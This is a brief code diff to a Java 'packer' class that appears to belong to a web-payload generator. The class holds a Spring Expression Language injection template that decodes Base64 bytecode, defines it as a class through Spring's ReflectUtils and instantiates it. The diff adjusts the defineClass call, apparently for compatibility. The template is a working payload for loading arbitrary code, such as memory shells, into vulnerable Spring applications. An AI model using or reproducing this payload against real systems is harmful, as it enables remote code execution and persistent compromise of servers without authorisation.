@@ -8,7 +8,7 @@ import com.reajason.javaweb.packer.Packer;
  * @since 2024/12/13
  */
 public class SpELSpringUtilsPacker implements Packer {
-    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}'),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser')).newInstance()";
+    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";
 
     @Override
     public String pack(ClassPackerConfig config) {
